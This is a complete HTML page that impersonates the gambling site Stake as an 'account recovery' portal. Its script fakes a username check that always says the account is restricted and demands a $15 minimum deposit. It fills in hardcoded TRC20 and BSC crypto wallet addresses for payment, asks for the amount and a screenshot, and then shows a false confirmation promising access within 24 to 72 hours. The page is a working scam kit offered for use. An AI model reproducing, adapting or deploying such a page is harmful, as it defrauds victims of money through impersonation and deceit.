<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ReStakeAccess Account Recovery</title>
  <style>
    * {
      box-sizing: border-box;
    }
    html, body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #0f212e;
      color: #ffffff;
      min-height: 100vh;
      overflow-y: auto; /* âœ… Scroll allowed */
    }
    .container {
      background-color: #1e2f40;
      max-width: 500px;
      margin: 40px auto;
      padding: 25px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(0,255,150,0.1);
    }
    .header {
      text-align: center;
    }
    .header img {
      width: 120px;
      margin: 20px auto;
    }
    .header h2 {
      color: #02dc05;
      margin-bottom: 20px;
    }
    .form-group {
      margin-bottom: 18px;
    }
    label {
      font-weight: bold;
      display: block;
      margin-bottom: 6px;
    }
    input, select, button {
      width: 100%;
      padding: 10px;
      border-radius: 8px;
      border: none;
      font-size: 1rem;
    }
    input, select {
      background-color: #283b4c;
      color: #fff;
    }
    button {
      background-color: #02dc05;
      color: white;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    button:disabled {
      background-color: #444;
      cursor: not-allowed;
    }
    .copy-btn {
      background-color: #2c8fff;
      margin-top: 8px;
    }
    .message {
      margin-top: 10px;
      font-size: 0.95rem;
      color: #00ffae;
    }
    #popup {
      position: fixed;
      z-index: 9999;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: #1e2f40;
      padding: 25px;
      border-radius: 14px;
      box-shadow: 0 0 30px rgba(0,255,150,0.2);
      text-align: center;
      display: none;
    }
    #popup p {
      color: #ffdc00;
      font-weight: bold;
      font-size: 1rem;
    }
    #popup button {
      margin-top: 15px;
      background-color: #02dc05;
      color: #fff;
      padding: 10px 20px;
      border-radius: 8px;
    }
    .blur-effect {
      filter: blur(5px);
      pointer-events: none;
      user-select: none;
    }
  </style>
</head>
<body>
  <div id="main-content">
    <div class="container">
      <div class="header">
        <img src="stake-logo-white.png" alt="Stake Logo">
        <h2>Account Recovery</h2>
      </div>

      <div class="form-group">
        <label>Username</label>
        <input type="text" id="username" placeholder="Enter Stake Username">
        <button onclick="verifyUsername()">Verify</button>
        <div class="message" id="verify-msg"></div>
      </div>

      <div class="form-group">
        <label>Coin</label>
        <select id="coin" onchange="updateAddress()">
          <option value="">--Select Coin--</option>
          <option value="usdt">USDT</option>
          <option value="btc">BTC</option>
          <option value="trx">TRX</option>
          <option value="eth">ETH</option>
        </select>
      </div>

      <div class="form-group">
        <label>Network</label>
        <select id="network" onchange="updateAddress()">
          <option value="">--Select Network--</option>
          <option value="trc20">TRC20</option>
          <option value="bsc">BSC</option>
        </select>
      </div>

      <div class="form-group">
        <label>Wallet Address</label>
        <input type="text" id="address" readonly>
        <button class="copy-btn" onclick="copyAddress()">Copy</button>
      </div>

      <div class="form-group">
        <label>Amount ($)</label>
        <input type="number" id="amount" placeholder="Enter Amount">
      </div>

      <div class="form-group">
        <label>Upload Screenshot</label>
        <input type="file" id="screenshot">
      </div>

      <button id="submitBtn" onclick="submitForm()" disabled>Submit</button>
    </div>
  </div>

  <div id="popup">
    <p>Your account recovery request has been received.<br>We forward your query to the Stake technical team.<br>Your Stake account will be fully active within 24 - 72 hours.</p>
    <button onclick="closePopup()">OK</button>
  </div>

  <script>
    const addressMap = {
      usdt: {
        trc20: 'TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA',
        bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c'
      },
      btc: {
        bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c'
      },
      trx: {
        trc20: 'TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA',
        bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c'
      },
      eth: {
        bsc: '0x4d31c46627c343939e7a02383c2451048a509a0c'
      }
    };

    function verifyUsername() {
      const msg = document.getElementById('verify-msg');
      msg.innerHTML = 'Verifying...';
      setTimeout(() => {
        msg.innerHTML = 'Your Stake account is currently restricted to withdrawal-only mode. To unlock full access, a minimum deposit of $15 is required.';
      }, 1500);
    }

    function updateAddress() {
      const coin = document.getElementById('coin').value;
      const network = document.getElementById('network').value;
      const addressField = document.getElementById('address');

      if (coin && network && addressMap[coin] && addressMap[coin][network]) {
        addressField.value = addressMap[coin][network];
      } else {
        addressField.value = '';
      }
      checkForm();
    }

    function copyAddress() {
      const address = document.getElementById('address');
      address.select();
      address.setSelectionRange(0, 99999);
      navigator.clipboard.writeText(address.value);
      alert("Address copied!");
    }

    function checkForm() {
      const username = document.getElementById('username').value;
      const coin = document.getElementById('coin').value;
      const network = document.getElementById('network').value;
      const address = document.getElementById('address').value;
      const amount = document.getElementById('amount').value;
      const screenshot = document.getElementById('screenshot').files.length;

      const btn = document.getElementById('submitBtn');
      btn.disabled = !(username && coin && network && address && amount && screenshot);
    }

    document.querySelectorAll('input, select').forEach(el => {
      el.addEventListener('change', checkForm);
    });

    function submitForm() {
      document.getElementById('main-content').classList.add('blur-effect');
      document.getElementById('popup').style.display = 'block';
    }

    function closePopup() {
      location.reload();
    }
  </script>
</body>
</html>
